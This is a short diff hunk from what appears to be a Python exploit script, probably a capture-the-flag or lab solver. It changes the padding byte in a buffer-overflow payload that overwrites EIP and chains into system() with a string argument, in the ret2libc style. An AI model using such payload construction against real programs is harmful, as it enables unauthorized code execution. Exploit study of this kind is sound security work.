@@ -36,7 +36,7 @@ def exploit(binary_path):
         log.debug(f"The offset calculated overwrite EIP is {offset} bytes")
 
         # Construct the payload
-        payload = b'A' * offset
+        payload = b'\x69' * offset
         payload += p32(system_addr)
         payload += p32(0x0)
         payload += p32(string_addr)
